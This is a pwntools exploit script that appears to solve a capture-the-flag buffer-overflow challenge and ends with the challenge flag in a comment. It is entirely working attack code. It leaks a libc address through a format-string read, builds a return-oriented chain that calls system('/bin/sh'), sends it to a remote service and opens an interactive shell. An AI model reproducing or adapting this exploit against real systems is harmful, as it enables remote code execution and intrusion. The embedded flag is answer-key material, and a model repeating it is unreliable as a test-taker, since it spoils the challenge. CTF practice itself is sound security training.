from pwn import *

exe = ELF("./bof_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")

script = '''
b *0x40131F

'''

p = remote("10.8.0.1", 5004)
#p = process("./bof_patched")
#p = gdb.debug("./bof_patched", gdbscript = script)

p.sendlineafter(b"name: ", b"%29$p")
libc_base = int(p.recvline(14), 16) - 0x29d90
print(hex(libc_base))
system = libc_base + libc.symbols['system']
pop_rdi = libc_base + 0x000000000002a3e5
ret = pop_rdi + 1
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]

payload = b"A" * 0x70
payload += p64(0) + p64(pop_rdi)
payload += p64(binsh) + p64(ret)
payload += p64(system)
p.sendlineafter(b"string: ", payload)

p.interactive()
#BKSEC{buff3t_0verfl0w}